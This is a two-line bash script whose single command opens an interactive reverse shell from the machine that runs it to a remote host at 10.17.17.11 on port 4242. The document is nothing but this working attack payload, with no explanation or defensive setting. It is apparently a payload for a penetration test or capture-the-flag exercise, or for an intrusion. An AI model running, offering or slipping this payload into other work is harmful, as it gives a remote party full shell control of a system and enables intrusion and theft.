#!/bin/bash

bash -i >& /dev/tcp/10.17.17.11/4242 0>&1
